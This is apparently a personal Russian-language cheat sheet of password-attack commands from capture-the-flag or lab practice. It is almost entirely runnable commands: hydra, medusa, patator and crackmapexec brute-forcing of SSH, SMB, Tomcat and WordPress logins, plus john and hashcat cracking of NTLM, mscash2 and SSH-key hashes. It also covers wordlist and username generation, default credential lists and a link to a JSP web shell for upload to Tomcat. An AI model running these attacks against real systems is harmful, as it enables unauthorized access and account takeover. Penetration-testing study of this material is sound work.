# Определение типа хеша

https://www.tunnelsup.com/hash-analyzer/

hashid file -m

hashcat --example-hashes

# Определение модуля для хеша в хаш кат

https://hashcat.net/wiki/doku.php?id=example_hashes

# Перебор паролей для сервисов SSH, smb и т.д.

patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’

medusa -h 192.168.50.38 -u michael -P rockyou.txt -M ssh -f -v 6

(почему то для домена) 

hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"

hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt 192.168.1.5 smb -V

(не для домена)

hydra -l micha -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.200

!!!!Brute char!!!! -x min:max:Aa1%

hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V

hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html/   (перебор ВЕБ паролей)

hydra -l admin P seclist/Password/dakweb2017top100 f 10,10,10,10 http-get /monitoring

hydra -vV -l elliot -P pass.txt 192.168.50.123 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'    ---(Последнее из BURPA)

hydra -vV -f -l admin -P pass.txt 10.10.11.114 http-post-form -m '/login:username=^USER^&password=^PASS^:Invalid password.'

# Перебор хешей по словарю и брут

***Взлом приватного ключа ssh

ssh2john.py private.key > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash_crack

***
john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash

john --format=mscash2 --mask='?a' --min-length=7 --max-length=10 filehash

john --format=mscash2 -1=?l?u?d --mask=Password12'?1' --min-length=11 --max-length=18 security_parse.txt

Показать форматы

john --list=formats

Показать крякнутые хеши

john --show ФАЙЛ-ХЕШЕЙ

Продолжить прерванную сессию

john --restore

john сохраняет логи в домашней директории ~/.john


лучше чиcтый хешь

может несколько хешей

справка по хакат про експлойт хешей

$DCC2$10240#max_1#f4bb2ed0b323b3fa5efcc8ad8314377b


hashcat -m 1000 hash.txt dict.txt

hashcat ujas.txt rockyou.txt - автодетектинг хеша (файл может быть с хламом)

Загляним в справку Hashcat, чтобы узнать номер режима хеша NTLM: 1000 | NTLM  

Брут хешей
hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 -1 ?l?u?d FB6CEDE76A37702EAD2615DC27B626EF ?1?1?1?1?1?1?1?1?1?1?1?1?1



hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 6A6E1BB24F869966A450203F373C8EA6 ?a?a?a?a?a?a?a?a
 -a  атака по словарю 0, брутфорс 3



 
  В Hashcat встроенными наборами символов являются:	


  
? | Набор символов
===+=========
 l | abcdefghijklmnopqrstuvwxyz
 u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
 d | 0123456789
 h | 0123456789abcdef
 H | 0123456789ABCDEF
 s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
 
 a | ?l?u?d?s
 b | 0x00 - 0xff

# Brute по правилу

hashcat -m 3200 hash.txt -r pw /usr/share/hashcat/rules/best64.rule


# Создание паролей
	crunch 6 8 1234567890 -о /гооt/wordlist.lst:

https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1

# Список кредов для TOM CAT (LABA JERRY)

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt

https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp (Броузер на JSP - для загрузки в том кота)




# Создание мутаций имен и фамилий

https://github.com/urbanadventurer/username-anarchy

./username-anarchy --input-file fullnames.txt --select-format
first,flast,first.last,firstl > unames.txt

Пример 
Firstname,Lastname
Fergus,Smith
Shaun,Coins
Sophie,Driver
Bowie,Taylor
Hugo,Bear
Steven,Kerb
# Генеартор паролей по правилам из файла

hashcat --stdout pw -r /usr/share/hashcat/rules/best64.rule


# ГЕНЕРАТОР ПАРОЛЕЙ СО СТРАНИЧКИ САЙТА

	cewl -d 7 -m 8 --with-numbers -w cewl.out http://fuse.fabricorp.local/papercut/logs/html/index.htm

# ГЕНЕРАТОР ПАРОЛЕЙ ИЗ ПОЛЬЗОВАТЕЛЬСКОГО ВВОДА

	hashcat --force custom  -r /usr/share/hashcat/rules/best64.rule --stdout >hashcat_words
	hashcat --force custom  -r /usr/share/hashcat/InsidePro-PasswordsPro.rule --stdout >hashcat_words
 	mousepad self_rule --> $! -->:
 
где custom - файл с разными данными о всем пользователи или домене

# Брут пользователей с помощь crackmapexec

crackmapexec smb streamio.htb -u users.txt -p passwords.txt

	---- Брут пользователей по RID (относительный идентификатор)

crackmapexec smb 10.10.10.149 -u Hazard -p stealth1agent --rid-brute


# Брутилка пароля пользователей линукс sucrack

git clone https://github.com/hemp3l/sucrack.git

cd sucrack && ./configure && autoreconf -f -i 

make

cd src

	./sucrack -a -w 20 -s 10 -u max -r file
# Список имен русских
		https://github.com/Raven-SL/ru-pnames-list/tree/master/lists
# Список нерусских имен
		https://github.com/insidetrust/statistically-likely-usernames/tree/master

# Список русских имен с транслитерацией
		https://github.com/sorokinpf/russian_names/blob/master/
  
# Словари

https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd
https://github.com/Bo0oM/fuzz.txt

https://www.weakpass.com/wordlists/hashesorg

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
